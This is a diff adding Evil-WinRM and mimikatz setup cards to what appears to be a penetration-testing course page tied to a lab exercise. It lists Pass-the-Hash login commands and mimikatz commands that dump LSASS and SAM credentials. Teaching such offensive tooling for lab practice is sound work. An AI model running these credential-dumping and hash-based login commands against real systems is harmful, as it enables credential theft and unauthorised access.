@@ -682,6 +682,66 @@
           <span>CLI · AD</span>
         </div>
       </article>
+
+      <!-- evil-winrm -->
+      <article class="tool-setup-card" id="evil-winrm">
+        <div class="tool-setup-card__header">
+          <div class="tool-setup-card__title-group">
+            <span class="tool-setup-card__icon">👑</span>
+            <h2 class="tool-setup-card__title">Evil-WinRM</h2>
+          </div>
+          <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.3);">WINDOWS SHELL</span>
+        </div>
+        <p class="tool-setup-card__desc">An interactive shell over Windows Remote Management. Its headline feature for pentesters: log in with just an NTLM hash (<code>-H</code>), no password, which is how Pass-the-Hash becomes a shell as Administrator.</p>
+        <div class="tool-setup-steps">
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Install</span>
+            <code>gem install evil-winrm</code>
+          </div>
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Log in with a password</span>
+            <code>evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt;</code>
+          </div>
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Log in with a hash (Pass-the-Hash)</span>
+            <code>evil-winrm -i &lt;IP&gt; -u Administrator -H &lt;NTLM_hash&gt;</code>
+          </div>
+        </div>
+        <div class="tool-setup-card__footer">
+          <span>Active in: <a href="./labs/lab12.html" class="badge-lab-ref">Lab 12</a></span>
+          <span>CLI · AD</span>
+        </div>
+      </article>
+
+      <!-- mimikatz -->
+      <article class="tool-setup-card" id="mimikatz">
+        <div class="tool-setup-card__header">
+          <div class="tool-setup-card__title-group">
+            <span class="tool-setup-card__icon">🧠</span>
+            <h2 class="tool-setup-card__title">mimikatz</h2>
+          </div>
+          <span class="comparison-badge" style="color:var(--color-danger);border-color:rgba(255,51,102,0.3);">CREDENTIAL DUMPING</span>
+        </div>
+        <p class="tool-setup-card__desc">Reads credentials out of Windows LSASS memory: plaintext passwords, NTLM hashes, and Kerberos tickets of everyone logged into the machine. Run it on a Windows host once you have admin; the engine behind most lateral movement.</p>
+        <div class="tool-setup-steps">
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Run (on the Windows host, as admin)</span>
+            <code>mimikatz.exe</code>
+          </div>
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Dump logged-in credentials</span>
+            <code>privilege::debug  then  sekurlsa::logonpasswords</code>
+          </div>
+          <div class="tool-setup-step">
+            <span class="tool-setup-step-label">Dump local accounts</span>
+            <code>lsadump::sam</code>
+          </div>
+        </div>
+        <div class="tool-setup-card__footer">
+          <span>Active in: <a href="./labs/lab12.html" class="badge-lab-ref">Lab 12</a></span>
+          <span>Windows · post-exploitation</span>
+        </div>
+      </article>
     </div>
   </main>
 
